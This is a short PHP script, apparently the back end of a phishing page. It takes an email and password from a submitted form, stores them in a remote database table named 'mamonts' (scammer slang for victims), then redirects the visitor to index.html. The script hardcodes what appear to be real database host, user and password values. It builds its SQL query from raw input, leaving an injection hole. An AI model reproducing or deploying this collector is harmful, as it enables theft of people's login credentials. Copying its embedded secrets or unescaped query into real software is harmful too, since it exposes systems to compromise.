<?php
	$email = $_POST['email'];
	$pass = $_POST['pass'];
	$mysql = new mysqli('a372686.mysql.mchost.ru', 'a372686_1', '9Ne6ZKTVEtbY', 'a372686_1');
	$mysql -> query('set names utf8');
	$mysql -> query('set character set utf8');
	$mysql -> query('set character_set_client=utf8');
	$mysql -> query('set character_set_results=utf8');
	$mysql -> query('set character_set_connection=utf8');
	$mysql -> query('set character_set_database=utf8');
	$mysql -> query('set character_set_server=utf8');
	$mysql ->  query("SET SESSION collation_connection = 'utf8_general_ci';");
	$mysql ->  query("INSERT INTO `mamonts` (`email`, `password`) VALUES('$email', '$pass')");
	header('Location: index.html');
?>